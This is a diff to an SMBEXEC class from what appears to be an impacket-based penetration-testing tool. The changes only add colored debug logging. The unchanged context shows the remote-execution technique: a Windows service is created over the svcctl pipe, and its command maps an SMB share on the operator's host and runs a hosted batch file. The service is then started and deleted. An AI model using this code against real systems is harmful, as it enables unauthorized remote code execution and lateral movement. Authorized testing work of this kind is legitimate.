@@ -7,6 +7,7 @@
 # Imports
 import os, sys, logging, time
 from core.Utils import *
+from core.Colors import *
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.smbconnection import *
 
@@ -44,7 +45,7 @@ class SMBEXEC:
             self.__password = ''
 
         stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % self.__host
-        logging.debug('StringBinding %s'%stringbinding)
+        logging.debug("%sStringBinding %s" % (debugBlue, stringbinding))
         self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
         self.__rpctransport.set_dport(self.__port)
 
@@ -86,19 +87,19 @@ class SMBEXEC:
         with open(os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'tmp', self.__batchFile), 'w') as batch_file:
             batch_file.write(command)
 
-        logging.debug('Hosting batch file with command: ' + command)
+        logging.debug("%sHosting batch file with command: %s" % (debugBlue, command))
 
         command = self.__shell + 'net use \\\\{}\\{} /persistent:no /user:{} {} & \\\\{}\\{}\\tmp\\{} & net use \\\\{}\\{} /del'.format(local_ip, alea, alea, alea, local_ip, alea, self.__batchFile, local_ip, alea)
-        logging.debug('Command to execute: ' + command)
-        logging.debug('Remote service {} created.'.format(self.__serviceName))
+        logging.debug("%sCommand to execute: %s" % (debugBlue, command))
+        logging.debug("%sRemote service %s created." % (debugBlue, self.__serviceName))
         resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
         service = resp['lpServiceHandle']
         try:
-            logging.debug('Remote service {} started.'.format(self.__serviceName))
+            logging.debug("%sRemote service %s started." % (debugBlue, self.__serviceName))
             scmr.hRStartServiceW(self.__scmr, service)
         except:
            pass
-        logging.debug('Remote service {} deleted.'.format(self.__serviceName))
+        logging.debug("%sRemote service %s deleted." % (debugBlue, self.__serviceName))
         scmr.hRDeleteService(self.__scmr, service)
         scmr.hRCloseServiceHandle(self.__scmr, service)
         self.get_output_fileless()
